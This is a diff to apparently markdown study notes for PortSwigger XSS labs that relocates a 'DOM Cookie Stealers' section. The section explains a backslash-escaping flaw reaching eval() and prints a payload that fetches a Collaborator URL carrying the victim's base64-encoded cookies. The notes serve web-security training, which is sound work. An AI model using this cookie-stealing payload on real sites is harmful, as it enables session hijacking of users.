@@ -169,6 +169,22 @@
 ![DOM Invader resend web messages](images/dom-invader-resend-web-messages.png)  
   
 [PortSwigger: Identify DOM XSS using PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
+
+### DOM Cookie Stealers  
+
+>In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
+
+>***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
+
+```JavaScript
+\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
+```  
+
+>Image show the request using search function to send the document.cookie value in base64 to collaboration server.  
+
+![Reflected dom-xss json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
+
+[PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
   
 ## Cross Site Scripting  
 
@@ -292,23 +308,6 @@ https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransfo
 
 [PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)  
   
-
-### DOM Cookie Stealers  
-
->In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
-
->***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
-
-```JavaScript
-\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
-```  
-
->Image show the request using search function to send the document.cookie value in base64 to collaboration server.  
-
-![Reflected dom-xss json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
-
-[PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
-
 ### XSS Template Literal  
 
 >JavaScript template literal is ***identified*** by the back ticks **`** used to contain the string. On the target code we ***identify*** the search string is reflected inside a template literal string.  
